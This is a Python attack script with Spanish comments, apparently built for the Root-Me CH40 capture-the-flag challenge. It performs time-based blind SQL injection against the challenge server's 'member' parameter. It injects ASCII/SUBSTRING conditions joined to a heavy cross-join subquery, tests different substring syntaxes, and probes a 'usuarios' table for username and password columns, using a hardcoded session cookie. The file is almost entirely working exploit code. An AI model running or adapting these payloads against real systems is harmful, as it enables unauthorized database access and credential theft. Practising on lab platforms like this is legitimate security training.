#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 10 - PROBAR DIFERENTES SINTAXIS
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class DebugInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1)"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        payload = f"1 AND ({condition}) AND {self.heavy}"
        t = self.test_payload(payload, repeats=repeats)
        return t > self.threshold
    
    def test_condition(self, cond, expected):
        """Prueba una condición específica"""
        result = self.is_true(cond, repeats=2)
        print(f"  {cond:60} -> {result} (esperado: {expected})")
        return result

# EJECUCIÓN
injector = DebugInjector()

print("=" * 70)
print("  PROBANDO DIFERENTES SINTAXIS PARA SUBSTRING")
print("=" * 70)

# Probar diferentes sintaxis de subconsulta
print("\n[1] Probando sintaxis de extracción:")

tests = [
    # Sintaxis estándar
    ("ASCII(SUBSTRING('abc', 1, 1)) = 97", "TRUE"),
    ("ASCII(SUBSTRING('abc', 1, 1)) = 98", "FALSE"),
    
    # Con SELECT
    ("ASCII(SUBSTRING((SELECT 'abc'), 1, 1)) = 97", "TRUE"),
    ("ASCII(SUBSTRING((SELECT 'abc'), 1, 1)) = 98", "FALSE"),
    
    # Con comillas dobles
    ('ASCII(SUBSTRING("abc", 1, 1)) = 97', "TRUE"),
    ('ASCII(SUBSTRING((SELECT "abc"), 1, 1)) = 97', "TRUE"),
    
    # Con MID (alias de SUBSTRING en MySQL)
    ("ASCII(MID('abc', 1, 1)) = 97", "TRUE"),
    ("ASCII(MID((SELECT 'abc'), 1, 1)) = 97", "TRUE"),
    
    # Con SUBSTR (alias de SUBSTRING)
    ("ASCII(SUBSTR('abc', 1, 1)) = 97", "TRUE"),
    ("ASCII(SUBSTR((SELECT 'abc'), 1, 1)) = 97", "TRUE"),
]

for cond, expected in tests:
    injector.test_condition(cond, expected)
    time.sleep(0.05)

print("\n[2] Probando con valores numéricos:")
num_tests = [
    ("ASCII(SUBSTRING('123', 1, 1)) = 49", "TRUE (1)"),
    ("ASCII(SUBSTRING('123', 1, 1)) = 50", "FALSE (2)"),
    ("ASCII(SUBSTRING('123', 2, 1)) = 50", "TRUE (2)"),
    ("ASCII(SUBSTRING('123', 2, 1)) = 49", "FALSE (1)"),
]

for cond, expected in num_tests:
    injector.test_condition(cond, expected)
    time.sleep(0.05)

print("\n[3] Verificando si la tabla 'usuarios' realmente tiene datos:")
user_tests = [
    ("EXISTS(SELECT * FROM usuarios)", "TRUE"),
    ("EXISTS(SELECT username FROM usuarios)", "TRUE"),
    ("EXISTS(SELECT password FROM usuarios)", "TRUE"),
    ("SELECT COUNT(*) FROM usuarios > 0", "TRUE"),
]

for cond, expected in user_tests:
    injector.test_condition(cond, expected)
    time.sleep(0.05)
